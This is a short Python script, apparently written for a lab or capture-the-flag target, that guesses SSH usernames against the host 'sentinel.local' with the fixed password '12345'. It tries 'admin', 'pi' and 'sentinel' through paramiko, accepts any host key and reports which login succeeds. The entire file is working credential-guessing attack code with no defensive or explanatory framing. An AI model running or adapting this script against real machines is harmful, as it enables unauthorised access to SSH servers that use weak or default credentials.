import paramiko
import socket
import sys

HOSTNAME = "sentinel.local"
PASSWORD = "12345"

try:
    ip = socket.gethostbyname(HOSTNAME)
except Exception as e:
    sys.exit(1)

def try_login(username):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=PASSWORD, timeout=5)
        print(f"[*] SUCCESS! The username is: {username}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[*] Failed authentication for user: {username}")
    except Exception as e:
        print(f"[*] Error connecting as {username}: {e}")
    return False

if not try_login("admin"):
    if not try_login("pi"):
        try_login("sentinel")
